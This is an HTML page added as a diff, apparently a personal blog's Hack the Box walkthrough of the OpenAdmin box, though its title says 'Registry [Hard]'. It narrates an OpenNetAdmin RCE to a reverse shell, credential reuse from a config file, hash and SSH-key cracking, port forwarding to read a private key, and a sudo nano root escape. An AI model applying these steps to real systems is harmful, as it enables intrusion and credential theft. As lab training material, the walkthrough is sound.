@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Registry [Hard] - Linux :: 5ysk3y Pwnz — An online resource for Hack the Box stuff</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
+nMap Scan Let&amp;rsquo;s begin by seeing what ports are currently open:
+# Nmap 7.80 scan initiated Sat Jan 4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10." />
+<meta name="keywords" content="HTB, Hack the Box" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://5ysk3y.github.io/htb/guides/openadmin/" />
+
+
+
+
+<link rel="stylesheet" href="https://5ysk3y.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://5ysk3y.github.io/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://5ysk3y.github.io/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://5ysk3y.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Registry [Hard] - Linux :: 5ysk3y Pwnz">
+<meta property="og:description" content="OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
+nMap Scan Let&amp;rsquo;s begin by seeing what ports are currently open:
+# Nmap 7.80 scan initiated Sat Jan 4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10." />
+<meta property="og:url" content="https://5ysk3y.github.io/htb/guides/openadmin/" />
+<meta property="og:site_name" content="Registry [Hard] - Linux" />
+<meta property="og:image" content="https://5ysk3y.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-04-01 16:21:41 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    5ysk3y pwnZ
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/htb">HTB</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Home</a></li>
+      
+    
+      
+        <li><a href="/htb">HTB</a></li>
+      
+    
+      
+        <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://5ysk3y.github.io/htb/guides/openadmin/">Registry [Hard] - Linux</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-04-01
+    </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://5ysk3y.github.io/tags/hack-the-box/">Hack The Box</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/linux/">Linux</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/easy/">Easy</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/nano/">Nano</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/ona-exploit/">ONA Exploit</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/johntheripper/">JohnTheRipper</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        
+  <figure class="left" >
+    <img src="/images/guides/htb/openadmin.png"   />
+    
+  </figure>
+
+
+<p>OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.</p>
+<h4 id="nmap-scan">nMap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Let&rsquo;s begin by seeing what ports are currently open:</p>
+<pre><code># Nmap 7.80 scan initiated Sat Jan  4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.10.10.171
+Nmap scan report for 10.10.10.171
+Host is up (0.026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=38593%PV=Y%DS=2%DC=T%G=Y%TM=5E10EE11
+OS:%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
+OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
+OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
+OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
+OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
+OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
+OS:0%CD=S)
+
+Uptime guess: 34.527 days (since Sun Dec  1 07:18:22 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT      ADDRESS
+1   42.44 ms 10.10.14.
+2   42.49 ms 10.10.10.171
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan  4 19:57:05 2020 -- 1 IP address (1 host up) scanned in 21.38 seconds
+</code></pre><h4 id="notes">Notes<a href="#notes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>In a nutshell, we can see two open ports. Since SSH is up to date and we can&rsquo;t directly compromise it, let&rsquo;s move our attention to the web port. I did an initial Gobuster scan on the IP that also targeted HTML/PHP files  - this found 2 more sub-dir websites:</p>
+<pre><code>/index.html (Status: 200)
+/music (Status: 301)
+/artwork (Status: 301)
+/sierra (Status: 301)
+/server-status (Status: 403)
+</code></pre><p><code>/music</code> and <code>/sierra</code> seem to be independant sites, neither with anything too interestnig present. That said, one of them (/music) had a link to login that points here:</p>
+<p><code>http://10.10.10.171/ona/</code></p>
+<p>And this is vulnerable to a certain exploit:</p>
+<p><code>OpenNetAdmin 18.1.1 - Remote Code Execution</code></p>
+<p>This script requires dos2unix running on it prior to use because of weird character breaks etc but it works as intended out the box. I hijacked an existing reverse-shell script on the server, replacing the port and my IP with sed. Also opened up 9001 on the firewall as its locked down by default. Running the script via the browser got me a rev shell:</p>
+<p><code>/bin/bash ./47691.sh 10.10.10.171/ona/</code></p>
+<p>Once one the box I had a look at the <code>/etc/passwd</code> file and found the following 2 users with shell access, aside from root:</p>
+<ul>
+<li>Jimmy</li>
+<li>Joanna</li>
+</ul>
+<p>I then linpeas as the www-data user. Most of the interesting stuff appears to to be in the ONA (OpenNetAdmin) dir, i.e. /opt/ona. In here we got some DB creds:</p>
+<p><code>./www/local/config/database_settings.inc.php</code></p>
+<pre><code>&lt;?php
+$ona_contexts=array (
+  'DEFAULT' =&gt;
+  array (
+    'databases' =&gt;
+    array (
+      0 =&gt;
+      array (
+        'db_type' =&gt; 'mysqli',
+        'db_host' =&gt; 'localhost',
+        'db_login' =&gt; 'ona_sys',
+        'db_passwd' =&gt; 'n1nj4W4rri0R!',
+        'db_database' =&gt; 'ona_default',
+        'db_debug' =&gt; false,
+      ),
+    ),
+    'description' =&gt; 'Default data context',
+    'context_color' =&gt; '#D3DBFF',
+  ),
+);
+</code></pre><p>Testing this pass with one of the 2 available users; we get access as <em>Jimmy</em>. I also tried as the Joanna user but that failed. So we have one login:</p>
+<p><code>jimmy:n1nj4W4rri0R</code></p>
+<p>Theres a folder named <code>internal</code> within <code>/var/www</code> and its owned by Jimmy - only he and the <code>internal</code> group can access it so www-data cannot. Theres also a few PHP pages in here - they can be viewed directly by running a PHP server:</p>
+<p><code>php -S [ip:port]</code></p>
+<p>Viewing this you can see that it&rsquo;s a login page that takes you to a page containing a <code>shell_exec</code> statement. The code itself thankfully contians the password to get past the login form: <code>Revealed</code> - this was a SHA-512 hash that I cracked via hashes.org.  For testing I also did this via JTR on the my new, totally original, not-ippsec-inspired-what-so-ever, kracken rig:</p>
+<pre><code>root@kracken:~/hashes/htb/openadmin# john --show --format=Raw-SHA512 hash
+jimmy:Revealed
+</code></pre><p>The problem with the exec statement is that it runs as as the user thats running the file, i.e. Jimmy, so I couldn&rsquo;t initially see how I&rsquo;d be able to leverage it. Even more annoyingly the default exec command is a cat request to Joanna&rsquo;s id_rsa file, so it&rsquo;s like a double taunt.</p>
+<p>Digging further, I eventually noticed that the internal group shares both Jimmy and Joanna as common members:</p>
+<pre><code>jimmy@openadmin:/home$ cat /etc/group | grep -i internal
+internal:x:1002:jimmy,joanna
+</code></pre><p>Looking at listening ports on the machine we can also see something else interesting:</p>
+<pre><code>jimmy@openadmin:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 ::1:52846               :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+</code></pre><p>A unique local port (52846) is listening - curling it from the machine shows a page very similar to the one mentoned above in the internal folder. The problem is we cant access that port from our side to view the page via something like firefox. Except we can, using SSH port forwarding of course. I did this in the following manner:</p>
+<ol>
+<li>Login to the box via the usual means.</li>
+<li>On a brand new line press: <code>Shift</code> + <code>~</code> + <code>C</code> to drop into an interactive SSH prompt.</li>
+<li>Forward in the following manner:</li>
+</ol>
+<p><code>-L 9001:127.0.0.1:52846</code></p>
+<p>Alternatively, if I&rsquo;ve fluffed that up on the writeup, you can also do it in the following single line:</p>
+<p><code>ssh -L 9001:127.0.0.1:52846 -f -N jimmy@10.10.10.171</code></p>
+<p>This basically says that the client (i.e ME) will listen (-L) on port 9001, and SSH will tunnel those connections from 127.0.0.1, port 52846 - which is what we want as per the netstat. The full SSH command includes 2 additional flags - <code>-f</code> backgrounds the request so you don&rsquo;t see any output and <code>-N</code> tells SSH that no commands are to be run - both of these make it so you can seamlessly forward the port to your machine without any output or interaction besides the orignial command.</p>
+<p>Viewing the page on the forwarded port, we see something interesting. It runs the EXACT same exec code that we see in the <code>internal</code> directory only this time it runs it as Joanna - meaning we can actually cat the contents of the id_rsa file in her home folder. Result.</p>
+<p>Once I had the RSA key we used SSH2John to convert it to a format john was happy with and then passed it to the kracken which got us the passphrase: <code>bloodninjas</code></p>
+<p>Got in as Joanna. Got the user flag. Boom.</p>
+<hr>
+<h4 id="grooooooot">gRooooooot<a href="#grooooooot" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Root was unbelievably easy compared to the user steps.</p>
+<p>I ran linPeas but it wasn&rsquo;t really necessary; doing standard enum is enough. So I ran:</p>
+<p><code>sudo -l</code></p>
+<p>And found out Joanna had sudo access to the following command without password:</p>
+<p><code>sudo /bin/nano /opt/priv</code></p>
+<p>It was purely a case of running that exact command along with <a href="https://gtfobins.github.io/gtfobins/nano/#sudo" target="_blank">this</a>
+ from GTFOBins:</p>
+<pre><code># id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+2f907ed450b361b2c2bf4e8795d5b561
+#
+</code></pre><p>Done! :)</p>
+
+      </div></div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="https://5ysk3y.github.io/htb/guides/registry/">
+          <span class="button__text">Registry [Hard] - Linux</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://5ysk3y.github.io/assets/main.js"></script>
+<script src="https://5ysk3y.github.io/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
